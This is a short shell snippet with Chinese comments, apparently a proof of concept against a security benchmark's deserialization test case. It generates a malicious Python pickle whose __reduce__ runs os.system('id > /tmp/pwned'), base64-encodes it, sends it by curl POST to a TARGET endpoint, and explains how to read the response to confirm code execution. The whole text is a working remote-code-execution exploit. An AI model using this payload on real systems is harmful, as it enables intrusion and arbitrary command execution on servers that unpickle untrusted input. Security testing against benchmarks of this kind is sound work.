# 1. 生成恶意 pickle payload
python3 -c "
import pickle, base64, os
class RCE:
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned',))
payload = pickle.dumps(RCE())
print(base64.urlsafe_b64encode(payload).decode())
"

# 2. 发送 POST 请求触发反序列化
curl -X POST 'http://TARGET:8443/benchmark/deserialization-00/BenchmarkTest00164' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'BenchmarkTest00164=<BASE64_ENCODED_PAYLOAD>'

# 3. 验证命令执行结果
# 响应若返回 "shared string is no pickles to be seen here" 表示成功
# 若返回 "Unpickling failed!" 表示 payload 格式有误